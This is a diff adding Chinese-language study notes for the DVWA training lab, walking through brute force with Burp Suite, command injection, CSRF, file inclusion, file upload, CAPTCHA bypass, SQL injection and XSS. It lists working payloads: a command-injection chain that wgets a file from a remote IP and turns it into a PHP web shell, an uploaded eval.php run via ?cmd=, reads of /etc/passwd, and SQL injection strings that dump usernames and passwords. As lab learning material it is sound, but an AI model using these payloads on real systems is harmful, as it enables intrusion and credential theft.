@@ -1,0 +1,65 @@
+Brute Force
+---
+firefox設定proxy,例外處理localhost,127.0.0.1移除
+開啟burp suite,確認Proxy->Intercept->Intercept is on
+網頁選擇Brute Force,帳密以test送出
+在burp suite Proxy->Intercept->Raw 使用Ctri+I
+Intruder->Positions的Attack type選Cluster bomb,在usernameusername,password在test左右加上$
+Intruder->Payloads->Payload Options添加字典檔或自定義,若帳號密碼都要破解的話Payload set1及set2都須設定字典檔
+Intruder右上角Start attack
+---
+Command Injection
+---
+透過&&,&,|後接續第二句cmd
+其中&&跟&的差異為&&前一句語法須執行成功才會執行第二句語法
+127.0.0.1 & wget ip/eval.txt
+127.0.0.1 & cp eval.txt eval.php
+127.0.0.1/dvwa/vulnerablitites/exec/eval.php?cmd=phpinfo()
+---
+CSRF
+---
+將CSRF.html點兩下開啟後點選click送出修改密碼
+---
+File Inclusion
+---
+在linux上/dvwa/vulnerabilities/fi/page=/etc/passwd
+或者使用多次../往上層目錄尋找
+建立一個phpinfo.txt放在另外一個伺服器上
+透過/dvwa/vulnerabilities/fi/page=http://localhost/phpinfo.txt進行讀取
+---
+File Upload
+---
+上傳一eval.php
+ip/dvwa/hackable/uploads/eval.php?cmd=指令
+---
+Insecure CAPTCHA
+---
+firefox設定proxy,例外處理localhost,127.0.0.1移除
+開啟burp suite,確認Proxy->Intercept->Intercept is on
+送出密碼後burp suite修改step=2後forward
+---
+SQL Injection
+---
+輸入1' or 1 ='1 可看到所以資料
+1' union select 1,database()# 可看見目前資料庫
+1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 可顯示所有資料表
+1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ # 顯示使用者
+1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #
+---
+SQL Injection(Blind)
+---
+1’ and length(database())=數字 #更改數字猜測資料庫名稱長度
+1’ and ascii(substr(databse(),1,1))>數字 #更改數字ascii反推資料庫名稱
+1’ and (select count (table_name) from information_schema.tables where table_schema=database())=數字 #更改數字猜測資料表數量
+1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=數字 #更改數字猜測資料表名稱長度
+1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97 #更改數字ascii反推資料表名稱
+---
+XSS(Reflected)
+---
+<script>alert(/xss/)</script>
+---
+XSS(Stored)
+---
+<script>alert(/xss/)</script>
+---
+其餘XSS語法可參考XSS Filter Evasion Cheat Sheet
